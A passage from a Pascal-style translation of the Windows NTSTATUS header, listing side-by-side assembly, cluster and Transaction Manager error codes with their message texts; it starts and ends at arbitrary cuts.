STATUS_SXS_COMPONENT_STORE_CORRUPT = NTSTATUS($C015001A);

//
// MessageId: STATUS_SXS_FILE_HASH_MISMATCH
//
// MessageText:
//
// A component's file does not match the verification information present in the component manifest.
//
STATUS_SXS_FILE_HASH_MISMATCH    = NTSTATUS($C015001B);

//
// MessageId: STATUS_SXS_MANIFEST_IDENTITY_SAME_BUT_CONTENTS_DIFFERENT
//
// MessageText:
//
// The identities of the manifests are identical but their contents are different.
//
STATUS_SXS_MANIFEST_IDENTITY_SAME_BUT_CONTENTS_DIFFERENT = NTSTATUS($C015001C);

//
// MessageId: STATUS_SXS_IDENTITIES_DIFFERENT
//
// MessageText:
//
// The component identities are different.
//
STATUS_SXS_IDENTITIES_DIFFERENT  = NTSTATUS($C015001D);

//
// MessageId: STATUS_SXS_ASSEMBLY_IS_NOT_A_DEPLOYMENT
//
// MessageText:
//
// The assembly is not a deployment.
//
STATUS_SXS_ASSEMBLY_IS_NOT_A_DEPLOYMENT = NTSTATUS($C015001E);

//
// MessageId: STATUS_SXS_FILE_NOT_PART_OF_ASSEMBLY
//
// MessageText:
//
// The file is not a part of the assembly.
//
STATUS_SXS_FILE_NOT_PART_OF_ASSEMBLY = NTSTATUS($C015001F);

//
// MessageId: STATUS_ADVANCED_INSTALLER_FAILED
//
// MessageText:
//
// An advanced installer failed during setup or servicing.
//
STATUS_ADVANCED_INSTALLER_FAILED = NTSTATUS($C0150020);

//
// MessageId: STATUS_XML_ENCODING_MISMATCH
//
// MessageText:
//
// The character encoding in the XML declaration did not match the encoding used in the document.
//
STATUS_XML_ENCODING_MISMATCH     = NTSTATUS($C0150021);

//
// MessageId: STATUS_SXS_MANIFEST_TOO_BIG
//
// MessageText:
//
// The size of the manifest exceeds the maximum allowed.
//
STATUS_SXS_MANIFEST_TOO_BIG      = NTSTATUS($C0150022);

//
// MessageId: STATUS_SXS_SETTING_NOT_REGISTERED
//
// MessageText:
//
// The setting is not registered.
//
STATUS_SXS_SETTING_NOT_REGISTERED = NTSTATUS($C0150023);

//
// MessageId: STATUS_SXS_TRANSACTION_CLOSURE_INCOMPLETE
//
// MessageText:
//
// One or more required members of the transaction are not present.
//
STATUS_SXS_TRANSACTION_CLOSURE_INCOMPLETE = NTSTATUS($C0150024);

//
// MessageId: STATUS_SMI_PRIMITIVE_INSTALLER_FAILED
//
// MessageText:
//
// The SMI primitive installer failed during setup or servicing.
//
STATUS_SMI_PRIMITIVE_INSTALLER_FAILED = NTSTATUS($C0150025);

//
// MessageId: STATUS_GENERIC_COMMAND_FAILED
//
// MessageText:
//
// A generic command executable returned a result that indicates failure.
//
STATUS_GENERIC_COMMAND_FAILED    = NTSTATUS($C0150026);

//
// MessageId: STATUS_SXS_FILE_HASH_MISSING
//
// MessageText:
//
// A component is missing file verification information in its manifest.
//
STATUS_SXS_FILE_HASH_MISSING     = NTSTATUS($C0150027);


//
//  Cluster error values
//

//
// MessageId: STATUS_CLUSTER_INVALID_NODE
//
// MessageText:
//
// The cluster node is not valid.
//
STATUS_CLUSTER_INVALID_NODE      = NTSTATUS($C0130001);

//
// MessageId: STATUS_CLUSTER_NODE_EXISTS
//
// MessageText:
//
// The cluster node already exists.
//
STATUS_CLUSTER_NODE_EXISTS       = NTSTATUS($C0130002);

//
// MessageId: STATUS_CLUSTER_JOIN_IN_PROGRESS
//
// MessageText:
//
// A node is in the process of joining the cluster.
//
STATUS_CLUSTER_JOIN_IN_PROGRESS  = NTSTATUS($C0130003);

//
// MessageId: STATUS_CLUSTER_NODE_NOT_FOUND
//
// MessageText:
//
// The cluster node was not found.
//
STATUS_CLUSTER_NODE_NOT_FOUND    = NTSTATUS($C0130004);

//
// MessageId: STATUS_CLUSTER_LOCAL_NODE_NOT_FOUND
//
// MessageText:
//
// The cluster local node information was not found.
//
STATUS_CLUSTER_LOCAL_NODE_NOT_FOUND = NTSTATUS($C0130005);

//
// MessageId: STATUS_CLUSTER_NETWORK_EXISTS
//
// MessageText:
//
// The cluster network already exists.
//
STATUS_CLUSTER_NETWORK_EXISTS    = NTSTATUS($C0130006);

//
// MessageId: STATUS_CLUSTER_NETWORK_NOT_FOUND
//
// MessageText:
//
// The cluster network was not found.
//
STATUS_CLUSTER_NETWORK_NOT_FOUND = NTSTATUS($C0130007);

//
// MessageId: STATUS_CLUSTER_NETINTERFACE_EXISTS
//
// MessageText:
//
// The cluster network interface already exists.
//
STATUS_CLUSTER_NETINTERFACE_EXISTS = NTSTATUS($C0130008);

//
// MessageId: STATUS_CLUSTER_NETINTERFACE_NOT_FOUND
//
// MessageText:
//
// The cluster network interface was not found.
//
STATUS_CLUSTER_NETINTERFACE_NOT_FOUND = NTSTATUS($C0130009);

//
// MessageId: STATUS_CLUSTER_INVALID_REQUEST
//
// MessageText:
//
// The cluster request is not valid for this object.
//
STATUS_CLUSTER_INVALID_REQUEST   = NTSTATUS($C013000A);

//
// MessageId: STATUS_CLUSTER_INVALID_NETWORK_PROVIDER
//
// MessageText:
//
// The cluster network provider is not valid.
//
STATUS_CLUSTER_INVALID_NETWORK_PROVIDER = NTSTATUS($C013000B);

//
// MessageId: STATUS_CLUSTER_NODE_DOWN
//
// MessageText:
//
// The cluster node is down.
//
STATUS_CLUSTER_NODE_DOWN         = NTSTATUS($C013000C);

//
// MessageId: STATUS_CLUSTER_NODE_UNREACHABLE
//
// MessageText:
//
// The cluster node is not reachable.
//
STATUS_CLUSTER_NODE_UNREACHABLE  = NTSTATUS($C013000D);

//
// MessageId: STATUS_CLUSTER_NODE_NOT_MEMBER
//
// MessageText:
//
// The cluster node is not a member of the cluster.
//
STATUS_CLUSTER_NODE_NOT_MEMBER   = NTSTATUS($C013000E);

//
// MessageId: STATUS_CLUSTER_JOIN_NOT_IN_PROGRESS
//
// MessageText:
//
// A cluster join operation is not in progress.
//
STATUS_CLUSTER_JOIN_NOT_IN_PROGRESS = NTSTATUS($C013000F);

//
// MessageId: STATUS_CLUSTER_INVALID_NETWORK
//
// MessageText:
//
// The cluster network is not valid.
//
STATUS_CLUSTER_INVALID_NETWORK   = NTSTATUS($C0130010);

//
// MessageId: STATUS_CLUSTER_NO_NET_ADAPTERS
//
// MessageText:
//
// No network adapters are available.
//
STATUS_CLUSTER_NO_NET_ADAPTERS   = NTSTATUS($C0130011);

//
// MessageId: STATUS_CLUSTER_NODE_UP
//
// MessageText:
//
// The cluster node is up.
//
STATUS_CLUSTER_NODE_UP           = NTSTATUS($C0130012);

//
// MessageId: STATUS_CLUSTER_NODE_PAUSED
//
// MessageText:
//
// The cluster node is paused.
//
STATUS_CLUSTER_NODE_PAUSED       = NTSTATUS($C0130013);

//
// MessageId: STATUS_CLUSTER_NODE_NOT_PAUSED
//
// MessageText:
//
// The cluster node is not paused.
//
STATUS_CLUSTER_NODE_NOT_PAUSED   = NTSTATUS($C0130014);

//
// MessageId: STATUS_CLUSTER_NO_SECURITY_CONTEXT
//
// MessageText:
//
// No cluster security context is available.
//
STATUS_CLUSTER_NO_SECURITY_CONTEXT = NTSTATUS($C0130015);

//
// MessageId: STATUS_CLUSTER_NETWORK_NOT_INTERNAL
//
// MessageText:
//
// The cluster network is not configured for internal cluster communication.
//
STATUS_CLUSTER_NETWORK_NOT_INTERNAL = NTSTATUS($C0130016);

//
// MessageId: STATUS_CLUSTER_POISONED
//
// MessageText:
//
// The cluster node has been poisoned.
//
STATUS_CLUSTER_POISONED          = NTSTATUS($C0130017);

//
// MessageId: STATUS_CLUSTER_NON_CSV_PATH
//
// MessageText:
//
// The path does not belong to a cluster shared volume.
//
STATUS_CLUSTER_NON_CSV_PATH      = NTSTATUS($C0130018);

//
// MessageId: STATUS_CLUSTER_CSV_VOLUME_NOT_LOCAL
//
// MessageText:
//
// The cluster shared volume is not locally mounted.
//
STATUS_CLUSTER_CSV_VOLUME_NOT_LOCAL = NTSTATUS($C0130019);

//
// MessageId: STATUS_CLUSTER_CSV_READ_OPLOCK_BREAK_IN_PROGRESS
//
// MessageText:
//
// The operation has failed because read oplock break is in progress.
//
STATUS_CLUSTER_CSV_READ_OPLOCK_BREAK_IN_PROGRESS = NTSTATUS($C0130020);

//
// MessageId: STATUS_CLUSTER_CSV_AUTO_PAUSE_ERROR
//
// MessageText:
//
// The operation has failed. CSVFS has to pause and refresh information.
//
STATUS_CLUSTER_CSV_AUTO_PAUSE_ERROR = NTSTATUS($C0130021);

//
// MessageId: STATUS_CLUSTER_CSV_REDIRECTED
//
// MessageText:
//
// The operation has failed. CSVFS does not allow block i/o in redirected mode.
//
STATUS_CLUSTER_CSV_REDIRECTED    = NTSTATUS($C0130022);

//
// MessageId: STATUS_CLUSTER_CSV_NOT_REDIRECTED
//
// MessageText:
//
// The operation has failed. CSVFS is not in redirected mode.
//
STATUS_CLUSTER_CSV_NOT_REDIRECTED = NTSTATUS($C0130023);

//
// MessageId: STATUS_CLUSTER_CSV_VOLUME_DRAINING
//
// MessageText:
//
// CSVFS is failing operation because it is in draining state.
//
STATUS_CLUSTER_CSV_VOLUME_DRAINING = NTSTATUS($C0130024);

//
// MessageId: STATUS_CLUSTER_CSV_SNAPSHOT_CREATION_IN_PROGRESS
//
// MessageText:
//
// The operation has failed because snapshot creation is in progress.
//
STATUS_CLUSTER_CSV_SNAPSHOT_CREATION_IN_PROGRESS = NTSTATUS($C0130025);

//
// MessageId: STATUS_CLUSTER_CSV_VOLUME_DRAINING_SUCCEEDED_DOWNLEVEL
//
// MessageText:
//
// The operation has succeeded on the down level file system, but CSV is failing it because it is in draining state.
//
STATUS_CLUSTER_CSV_VOLUME_DRAINING_SUCCEEDED_DOWNLEVEL = NTSTATUS($C0130026);

//
// MessageId: STATUS_CLUSTER_CSV_NO_SNAPSHOTS
//
// MessageText:
//
// Volsnap on the coordinating node returned an error indicating that there is no snapshots on this volume.
//
STATUS_CLUSTER_CSV_NO_SNAPSHOTS  = NTSTATUS($C0130027);

//
// MessageId: STATUS_CSV_IO_PAUSE_TIMEOUT
//
// MessageText:
//
// The operation has failed because CSV volume was not able to recover in time specified on this file object.
//
STATUS_CSV_IO_PAUSE_TIMEOUT      = NTSTATUS($C0130028);

//
// MessageId: STATUS_CLUSTER_CSV_INVALID_HANDLE
//
// MessageText:
//
// The operation has failed because CSV has invalidated this file object.
//
STATUS_CLUSTER_CSV_INVALID_HANDLE = NTSTATUS($C0130029);

//
// MessageId: STATUS_CLUSTER_CSV_SUPPORTED_ONLY_ON_COORDINATOR
//
// MessageText:
//
// This operation is supported only on the CSV coordinator node.
//
STATUS_CLUSTER_CSV_SUPPORTED_ONLY_ON_COORDINATOR = NTSTATUS($C0130030);

//
// MessageId: STATUS_CLUSTER_CAM_TICKET_REPLAY_DETECTED
//
// MessageText:
//
// Cluster CAM has detected that someone is trying to replay ticket.
//
STATUS_CLUSTER_CAM_TICKET_REPLAY_DETECTED = NTSTATUS($C0130031);


//
//  Transaction Manager error values
//

//
// MessageId: STATUS_TRANSACTIONAL_CONFLICT
//
// MessageText:
//
// The function attempted to use a name that is reserved for use by another transaction.
//
STATUS_TRANSACTIONAL_CONFLICT    = NTSTATUS($C0190001);

//
// MessageId: STATUS_INVALID_TRANSACTION
//
// MessageText:
//
// The transaction handle associated with this operation is not valid.
//
STATUS_INVALID_TRANSACTION       = NTSTATUS($C0190002);

//
// MessageId: STATUS_TRANSACTION_NOT_ACTIVE
//
// MessageText:
//
// The requested operation was made in the context of a transaction that is no longer active.
//
STATUS_TRANSACTION_NOT_ACTIVE    = NTSTATUS($C0190003);

//
// MessageId: STATUS_TM_INITIALIZATION_FAILED
//
// MessageText:
//
// The Transaction Manager was unable to be successfully initialized. Transacted operations are not supported.
//
STATUS_TM_INITIALIZATION_FAILED  = NTSTATUS($C0190004);

//
// MessageId: STATUS_RM_NOT_ACTIVE
//
// MessageText:
//
// Transaction support within the specified resource manager is not started or was shut down due to an error.
//
STATUS_RM_NOT_ACTIVE             = NTSTATUS($C0190005);

//
// MessageId: STATUS_RM_METADATA_CORRUPT
//
// MessageText:
//
// The metadata of the RM has been corrupted. The RM will not function.
//
STATUS_RM_METADATA_CORRUPT       = NTSTATUS($C0190006);

//
// MessageId: STATUS_TRANSACTION_NOT_JOINED
//
// MessageText:
//
// The resource manager has attempted to prepare a transaction that it has not successfully joined.
//
STATUS_TRANSACTION_NOT_JOINED    = NTSTATUS($C0190007);

//
// MessageId: STATUS_DIRECTORY_NOT_RM
//
// MessageText:
//
// The specified directory does not contain a file system resource manager.
//
STATUS_DIRECTORY_NOT_RM          = NTSTATUS($C0190008);

//
// MessageId: STATUS_COULD_NOT_RESIZE_LOG
//
// MessageText:
//
// The log could not be set to the requested size.
//
STATUS_COULD_NOT_RESIZE_LOG      = NTSTATUS($80190009);

//
// MessageId: STATUS_TRANSACTIONS_UNSUPPORTED_REMOTE
//
// MessageText:
//
// The remote server or share does not support transacted file operations.
//
STATUS_TRANSACTIONS_UNSUPPORTED_REMOTE = NTSTATUS($C019000A);

//
// MessageId: STATUS_LOG_RESIZE_INVALID_SIZE
//
// MessageText:
//
// The requested log size for the file system resource manager is invalid.
//
STATUS_LOG_RESIZE_INVALID_SIZE   = NTSTATUS($C019000B);

//
// MessageId: STATUS_REMOTE_FILE_VERSION_MISMATCH
//
// MessageText:
//
// The remote server sent mismatching version number or Fid for a file opened with transactions.
//
STATUS_REMOTE_FILE_VERSION_MISMATCH = NTSTATUS($C019000C);

//
// MessageId: STATUS_CRM_PROTOCOL_ALREADY_EXISTS
//
// MessageText:
//
// The RM tried to register a protocol that already exists.
//
STATUS_CRM_PROTOCOL_ALREADY_EXISTS = NTSTATUS($C019000F);

//
// MessageId: STATUS_TRANSACTION_PROPAGATION_FAILED
//
// MessageText:
//
// The attempt to propagate the Transaction failed.
//
STATUS_TRANSACTION_PROPAGATION_FAILED = NTSTATUS($C0190010);

//
// MessageId: STATUS_CRM_PROTOCOL_NOT_FOUND
//
// MessageText:
//
// The requested propagation protocol was not registered as a CRM.
//
STATUS_CRM_PROTOCOL_NOT_FOUND    = NTSTATUS($C0190011);

//
// MessageId: STATUS_TRANSACTION_SUPERIOR_EXISTS
//
// MessageText:
//
// The Transaction object already has a superior enlistment, and the caller attempted an operation that would have created a new superior. Only a single superior enlistment is allowed.
//
STATUS_TRANSACTION_SUPERIOR_EXISTS = NTSTATUS($C0190012);

//
// MessageId: STATUS_TRANSACTION_REQUEST_NOT_VALID
//
// MessageText:
//
// The requested operation is not valid on the Transaction object in its current state.
//
STATUS_TRANSACTION_REQUEST_NOT_VALID = NTSTATUS($C0190013);

//
// MessageId: STATUS_TRANSACTION_NOT_REQUESTED
//
// MessageText:
//
// The caller has called a response API, but the response is not expected because the TM did not issue the corresponding request to the caller.
//
STATUS_TRANSACTION_NOT_REQUESTED = NTSTATUS($C0190014);

//
// MessageId: STATUS_TRANSACTION_ALREADY_ABORTED
//
// MessageText:
//
// It is too late to perform the requested operation, since the Transaction has already been aborted.
//
STATUS_TRANSACTION_ALREADY_ABORTED = NTSTATUS($C0190015);

//
// MessageId: STATUS_TRANSACTION_ALREADY_COMMITTED
//
// MessageText:
//
// It is too late to perform the requested operation, since the Transaction has already been committed.
//
STATUS_TRANSACTION_ALREADY_COMMITTED = NTSTATUS($C0190016);

//
// MessageId: STATUS_TRANSACTION_INVALID_MARSHALL_BUFFER
//
// MessageText:
//
// The buffer passed in to NtPushTransaction or NtPullTransaction is not in a valid format.
//
STATUS_TRANSACTION_INVALID_MARSHALL_BUFFER = NTSTATUS($C0190017);

//
// MessageId: STATUS_CURRENT_TRANSACTION_NOT_VALID
//
// MessageText:
//
// The current transaction context associated with the thread is not a valid handle to a transaction object.
//
STATUS_CURRENT_TRANSACTION_NOT_VALID = NTSTATUS($C0190018);

//
// MessageId: STATUS_LOG_GROWTH_FAILED
//
// MessageText:
//
// An attempt to create space in the transactional resource manager's log failed. The failure status has been recorded in the event log.
//
STATUS_LOG_GROWTH_FAILED         = NTSTATUS($C0190019);

//
// MessageId: STATUS_OBJECT_NO_LONGER_EXISTS
//
// MessageText:
//
// The object (file, stream, link) corresponding to the handle has been deleted by a transaction savepoint rollback.
//
STATUS_OBJECT_NO_LONGER_EXISTS   = NTSTATUS($C0190021);

//
// MessageId: STATUS_STREAM_MINIVERSION_NOT_FOUND
//
// MessageText:
//
// The specified file miniversion was not found for this transacted file open.
//
STATUS_STREAM_MINIVERSION_NOT_FOUND = NTSTATUS($C0190022);

//
// MessageId: STATUS_STREAM_MINIVERSION_NOT_VALID
//
// MessageText:
//
// The specified file miniversion was found but has been invalidated. Most likely cause is a transaction savepoint rollback.
//
STATUS_STREAM_MINIVERSION_NOT_VALID = NTSTATUS($C0190023);

//
// MessageId: STATUS_MINIVERSION_INACCESSIBLE_FROM_SPECIFIED_TRANSACTION
//
// MessageText:
//
// A miniversion may only be opened in the context of the transaction that created it.
//
STATUS_MINIVERSION_INACCESSIBLE_FROM_SPECIFIED_TRANSACTION = NTSTATUS($C0190024);

//
// MessageId: STATUS_CANT_OPEN_MINIVERSION_WITH_MODIFY_INTENT
//
// MessageText:
//
// It is not possible to open a miniversion with modify access.
//
STATUS_CANT_OPEN_MINIVERSION_WITH_MODIFY_INTENT = NTSTATUS($C0190025);

//
// MessageId: STATUS_CANT_CREATE_MORE_STREAM_MINIVERSIONS
//
// MessageText:
//
// It is not possible to create any more miniversions for this stream.
//
STATUS_CANT_CREATE_MORE_STREAM_MINIVERSIONS = NTSTATUS($C0190026);

//
// MessageId: STATUS_HANDLE_NO_LONGER_VALID
//
// MessageText:
//
// The handle has been invalidated by a transaction. The most likely cause is the presence of memory mapping on a file or an open handle when the transaction ended or rolled back to savepoint.
//
STATUS_HANDLE_NO_LONGER_VALID    = NTSTATUS($C0190028);

//
// MessageId: STATUS_NO_TXF_METADATA
//
// MessageText:
//
// There is no transaction metadata on the file.
//
STATUS_NO_TXF_METADATA           = NTSTATUS($80190029);

//
// MessageId: STATUS_LOG_CORRUPTION_DETECTED
//
// MessageText:
//
// The log data is corrupt.
//
STATUS_LOG_CORRUPTION_DETECTED   = NTSTATUS($C0190030);

//
// MessageId: STATUS_CANT_RECOVER_WITH_HANDLE_OPEN
//
// MessageText:
//
// The file can't be recovered because there is a handle still open on it.
//
STATUS_CANT_RECOVER_WITH_HANDLE_OPEN = NTSTATUS($80190031);

//
// MessageId: STATUS_RM_DISCONNECTED
//
// MessageText:
//
// The transaction outcome is unavailable because the resource manager responsible for it has disconnected.
//
STATUS_RM_DISCONNECTED           = NTSTATUS($C0190032);

//
// MessageId: STATUS_ENLISTMENT_NOT_SUPERIOR
//
// MessageText:
//
// The request was rejected because the enlistment in question is not a superior enlistment.
//
STATUS_ENLISTMENT_NOT_SUPERIOR   = NTSTATUS($C0190033);

//
// MessageId: STATUS_RECOVERY_NOT_NEEDED
//
// MessageText:
//
// The transactional resource manager is already consistent. Recovery is not needed.
//
STATUS_RECOVERY_NOT_NEEDED       = NTSTATUS($40190034);

//
// MessageId: STATUS_RM_ALREADY_STARTED
//
// MessageText:
//
// The transactional resource manager has already been started.
//
STATUS_RM_ALREADY_STARTED        = NTSTATUS($40190035);

//
// MessageId: STATUS_FILE_IDENTITY_NOT_PERSISTENT
//
// MessageText:
//
// The file cannot be opened transactionally, because its identity depends on the outcome of an unresolved transaction.
//
STATUS_FILE_IDENTITY_NOT_PERSISTENT = NTSTATUS($C0190036);

//
// MessageId: STATUS_CANT_BREAK_TRANSACTIONAL_DEPENDENCY
//
// MessageText:
//
// The operation cannot be performed because another transaction is depending on the fact that this property will not change.
//
STATUS_CANT_BREAK_TRANSACTIONAL_DEPENDENCY = NTSTATUS($C0190037);

//
// MessageId: STATUS_CANT_CROSS_RM_BOUNDARY
//
// MessageText:
//
// The operation would involve a single file with two transactional resource managers and is therefore not allowed.
//
STATUS_CANT_CROSS_RM_BOUNDARY    = NTSTATUS($C0190038);

//
// MessageId: STATUS_TXF_DIR_NOT_EMPTY
//
// MessageText:
//
// The NTSTATUS($Txf directory must be empty for this operation to succeed.
//
STATUS_TXF_DIR_NOT_EMPTY         = NTSTATUS($C0190039);

//
// MessageId: STATUS_INDOUBT_TRANSACTIONS_EXIST
//
// MessageText:
//
// The operation would leave a transactional resource manager in an inconsistent state and is therefore not allowed.
//
STATUS_INDOUBT_TRANSACTIONS_EXIST = NTSTATUS($C019003A);

//
// MessageId: STATUS_TM_VOLATILE
//
// MessageText:
//
// The operation could not be completed because the transaction manager does not have a log.
//
STATUS_TM_VOLATILE               = NTSTATUS($C019003B);

//
// MessageId: STATUS_ROLLBACK_TIMER_EXPIRED
//
// MessageText:
//
// A rollback could not be scheduled because a previously scheduled rollback has already executed or been queued for execution.
//
STATUS_ROLLBACK_TIMER_EXPIRED    = NTSTATUS($C019003C);

//
// MessageId: STATUS_TXF_ATTRIBUTE_CORRUPT
//
// MessageText:
//
// The transactional metadata attribute on the file or directory %hs is corrupt and unreadable.
//
STATUS_TXF_ATTRIBUTE_CORRUPT     = NTSTATUS($C019003D);

//
// MessageId: STATUS_EFS_NOT_ALLOWED_IN_TRANSACTION
//
// MessageText:
//
// The encryption operation could not be completed because a transaction is active.
//
STATUS_EFS_NOT_ALLOWED_IN_TRANSACTION = NTSTATUS($C019003E);

//
// MessageId: STATUS_TRANSACTIONAL_OPEN_NOT_ALLOWED
//
// MessageText:
//
// This object is not allowed to be opened in a transaction.
//
STATUS_TRANSACTIONAL_OPEN_NOT_ALLOWED = NTSTATUS($C019003F);

//
// MessageId: STATUS_TRANSACTED_MAPPING_UNSUPPORTED_REMOTE
//
// MessageText:
//
// Memory mapping (creating a mapped section) a remote file under a transaction is not supported.
//
STATUS_TRANSACTED_MAPPING_UNSUPPORTED_REMOTE = NTSTATUS($C0190040);

//
// MessageId: STATUS_TXF_METADATA_ALREADY_PRESENT
//
// MessageText:
//
// Transaction metadata is already present on this file and cannot be superseded.
//
STATUS_TXF_METADATA_ALREADY_PRESENT = NTSTATUS($80190041);

//
// MessageId: STATUS_TRANSACTION_SCOPE_CALLBACKS_NOT_SET
//
// MessageText:
//
// A transaction scope could not be entered because the scope handler has not been initialized.
//
STATUS_TRANSACTION_SCOPE_CALLBACKS_NOT_SET = NTSTATUS($80190042);

//
// MessageId: STATUS_TRANSACTION_REQUIRED_PROMOTION
//
// MessageText:
//
// Promotion was required in order to allow the resource manager to enlist, but the transaction was set to disallow it.
//
STATUS_TRANSACTION_REQUIRED_PROMOTION = NTSTATUS($C0190043);

//
// MessageId: STATUS_CANNOT_EXECUTE_FILE_IN_TRANSACTION
//
// MessageText:
//
// This file is open for modification in an unresolved transaction and may be opened for execute only by a transacted reader.
//
STATUS_CANNOT_EXECUTE_FILE_IN_TRANSACTION = NTSTATUS($C0190044);

//
// MessageId: STATUS_TRANSACTIONS_NOT_FROZEN
//
// MessageText:
//
// The request to thaw frozen transactions was ignored because transactions had not previously been frozen.
//
STATUS_TRANSACTIONS_NOT_FROZEN   = NTSTATUS($C0190045);

//
// MessageId: STATUS_TRANSACTION_FREEZE_IN_PROGRESS
//
// MessageText:
//
// Transactions cannot be frozen because a freeze is already in progress.
//
STATUS_TRANSACTION_FREEZE_IN_PROGRESS = NTSTATUS($C0190046);

//
// MessageId: STATUS_NOT_SNAPSHOT_VOLUME
//
// MessageText:
//
// The target volume is not a snapshot volume. This operation is only valid on a volume mounted as a snapshot.
//
STATUS_NOT_SNAPSHOT_VOLUME       = NTSTATUS($C0190047);

//
// MessageId: STATUS_NO_SAVEPOINT_WITH_OPEN_FILES
//
// MessageText:
//
// The savepoint operation failed because files are open on the transaction. This is not permitted.
//
STATUS_NO_SAVEPOINT_WITH_OPEN_FILES = NTSTATUS($C0190048);

//
// MessageId: STATUS_SPARSE_NOT_ALLOWED_IN_TRANSACTION
//
// MessageText:
//
// The sparse operation could not be completed because a transaction is active on the file.
//
STATUS_SPARSE_NOT_ALLOWED_IN_TRANSACTION = NTSTATUS($C0190049);

//
// MessageId: STATUS_TM_IDENTITY_MISMATCH
//
// MessageText:
//
// The call to create a TransactionManager object failed because the Tm Identity stored in the logfile does not match the Tm Identity that was passed in as an argument.
//
STATUS_TM_IDENTITY_MISMATCH      = NTSTATUS($C019004A);

//
// MessageId: STATUS_FLOATED_SECTION
//
// MessageText:
//
// I/O was attempted on a section object that has been floated as a result of a transaction ending. There is no valid data.
//
STATUS_FLOATED_SECTION           = NTSTATUS($C019004B);

//
// MessageId: STATUS_CANNOT_ACCEPT_TRANSACTED_WORK
//
// MessageText:
//
// The transactional resource manager cannot currently accept transacted work due to a transient condition such as low resources.
//
STATUS_CANNOT_ACCEPT_TRANSACTED_WORK = NTSTATUS($C019004C);

//
// MessageId: STATUS_CANNOT_ABORT_TRANSACTIONS
//
// MessageText:
//
// The transactional resource manager had too many transactions outstanding that could not be aborted. The transactional resource manger has been shut down.
//
STATUS_CANNOT_ABORT_TRANSACTIONS = NTSTATUS($C019004D);

//
// MessageId: STATUS_TRANSACTION_NOT_FOUND
//
// MessageText:
//
// The specified Transaction was unable to be opened, because it was not found.
//
STATUS_TRANSACTION_NOT_FOUND     = NTSTATUS($C019004E);

//
// MessageId: STATUS_RESOURCEMANAGER_NOT_FOUND
//
// MessageText:
//
// The specified ResourceManager was unable to be opened, because it was not found.
//
STATUS_RESOURCEMANAGER_NOT_FOUND = NTSTATUS($C019004F);

//
// MessageId: STATUS_ENLISTMENT_NOT_FOUND
//
// MessageText:
//
// The specified Enlistment was unable to be opened, because it was not found.
//
STATUS_ENLISTMENT_NOT_FOUND      = NTSTATUS($C0190050);

//
// MessageId: STATUS_TRANSACTIONMANAGER_NOT_FOUND
//
// MessageText:
//
// The specified TransactionManager was unable to be opened, because it was not found.
//
STATUS_TRANSACTIONMANAGER_NOT_FOUND = NTSTATUS($C0190051);

//
// MessageId: STATUS_TRANSACTIONMANAGER_NOT_ONLINE
//
// MessageText:
//
// The object specified could not be created or opened, because its associated TransactionManager is not online.  The TransactionManager must be brought fully Online by calling RecoverTransactionManager to recover to the end of its LogFile before objects in its Transaction or ResourceManager namespaces can be opened.  In addition, errors in writing records to its LogFile can cause a TransactionManager to go offline.
//
STATUS_TRANSACTIONMANAGER_NOT_ONLINE = NTSTATUS($C0190052);

//
// MessageId: STATUS_TRANSACTIONMANAGER_RECOVERY_NAME_COLLISION
//
// MessageText:
//
// The specified TransactionManager was unable to create the objects contained in its logfile in the Ob namespace. Therefore, the TransactionManager was unable to recover.
//
STATUS_TRANSACTIONMANAGER_RECOVERY_NAME_COLLISION = NTSTATUS($C0190053);

//
// MessageId: STATUS_TRANSACTION_NOT_ROOT
//
// MessageText:
//
// The call to create a superior Enlistment on this Transaction object could not be completed, because the Transaction object specified for the enlistment is a subordinate branch of the Transaction. Only the root of the Transaction can be enlisted on as a superior.
//
STATUS_TRANSACTION_NOT_ROOT      = NTSTATUS($C0190054);

//
// MessageId: STATUS_TRANSACTION_OBJECT_EXPIRED
//
// MessageText:
//
// Because the associated transaction manager or resource manager has been closed, the handle is no longer valid.
//
STATUS_TRANSACTION_OBJECT_EXPIRED = NTSTATUS($C0190055);

//
// MessageId: STATUS_COMPRESSION_NOT_ALLOWED_IN_TRANSACTION
//
// MessageText:
//
// The compression operation could not be completed because a transaction is active on the file.
//
STATUS_COMPRESSION_NOT_ALLOWED_IN_TRANSACTION = NTSTATUS($C0190056);

//
// MessageId: STATUS_TRANSACTION_RESPONSE_NOT_ENLISTED
//
// MessageText:
//
// The specified operation could not be performed on this Superior enlistment, because the enlistment was not created with the corresponding completion response in the NotificationMask.
//
STATUS_TRANSACTION_RESPONSE_NOT_ENLISTED = NTSTATUS($C0190057);

//
// MessageId: STATUS_TRANSACTION_RECORD_TOO_LONG
//
// MessageText:
//
// The specified operation could not be performed, because the record that would be logged was too long. This can occur because of two conditions:  either there are too many Enlistments on this Transaction, or the combined RecoveryInformation being logged on behalf of those Enlistments is too long.
//
STATUS_TRANSACTION_RECORD_TOO_LONG = NTSTATUS($C0190058);

//
// MessageId: STATUS_NO_LINK_TRACKING_IN_TRANSACTION
//
// MessageText:
//
// The link tracking operation could not be completed because a transaction is active.
//
STATUS_NO_LINK_TRACKING_IN_TRANSACTION = NTSTATUS($C0190059);

//
// MessageId: STATUS_OPERATION_NOT_SUPPORTED_IN_TRANSACTION
//
// MessageText:
//
// This operation cannot be performed in a transaction.
//
STATUS_OPERATION_NOT_SUPPORTED_IN_TRANSACTION = NTSTATUS($C019005A);

//
// MessageId: STATUS_TRANSACTION_INTEGRITY_VIOLATED
//
// MessageText:
//
// The kernel transaction manager had to abort or forget the transaction because it blocked forward progress.
//
STATUS_TRANSACTION_INTEGRITY_VIOLATED = NTSTATUS($C019005B);

//
// MessageId: STATUS_TRANSACTIONMANAGER_IDENTITY_MISMATCH
//
// MessageText:
//
// The TransactionManager identity that was supplied did not match the one recorded in the TransactionManager's log file.
//
STATUS_TRANSACTIONMANAGER_IDENTITY_MISMATCH = NTSTATUS($C019005C);

//
// MessageId: STATUS_RM_CANNOT_BE_FROZEN_FOR_SNAPSHOT
//
// MessageText:
//
// This snapshot operation cannot continue because a transactional resource manager cannot be frozen in its current state.  Please try again.
//
STATUS_RM_CANNOT_BE_FROZEN_FOR_SNAPSHOT = NTSTATUS($C019005D);

//
// MessageId: STATUS_TRANSACTION_MUST_WRITETHROUGH
//
// MessageText:
//
// The transaction cannot be enlisted on with the specified EnlistmentMask, because the transaction has already completed the PrePrepare phase.  In order to ensure correctness, the ResourceManager must switch to a write-through mode and cease caching data within this transaction.  Enlisting for only subsequent transaction phases may still succeed.
//
STATUS_TRANSACTION_MUST_WRITETHROUGH = NTSTATUS($C019005E);

//
// MessageId: STATUS_TRANSACTION_NO_SUPERIOR
//
// MessageText:
//
// The transaction does not have a superior enlistment.
//
